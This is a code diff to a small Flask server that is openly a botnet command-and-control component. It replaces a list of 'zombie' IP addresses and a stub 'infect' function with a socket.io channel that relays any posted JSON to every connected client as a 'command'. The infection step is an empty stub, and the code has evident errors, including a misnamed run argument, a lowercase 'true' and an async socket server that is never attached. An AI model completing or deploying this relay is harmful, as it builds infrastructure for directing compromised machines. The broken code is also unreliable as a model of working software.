@@ -1,22 +1,27 @@
 from flask import Flask, request, Response
 import os, json
+import socketio
+
+
 app = Flask(__name__)
-zombies = ["192.168.10.5", "10.104.12.10"]
+sio = socketio.AsyncServer()
+sockets = []
 
+@sio.event
+def connect(sid, environ, auth):
+    sockets.append(sid)
 
-@app.route('/', methods=["GET"])
-def register_machine():
-    if request.remote_addr not in zombies:
-        zombies.append(request.remote_addr)
-        for item in zombies:
-            infect(item)
-    response = zombies.copy()
-    response.remove(request.remote_addr)
-    return Response(json.dumps({"IP": request.remote_addr, "Zombies": response}), 200)
+@sio.event
+def disconnect(sid):
+    sockets.remove(sid)
 
-def infect(ip):
-    print(ip)
-
+@app.route('/', methods=["GET", "POST"])
+def command_control():
+    print(request.get_json())
+    if sockets:
+        for s in sockets:
+            sio.emit("command", request.get_json(),room=s)
+    return "Done"
 
 if __name__ == '__main__':
     app.run(run="0.0.0.0",debug=true)
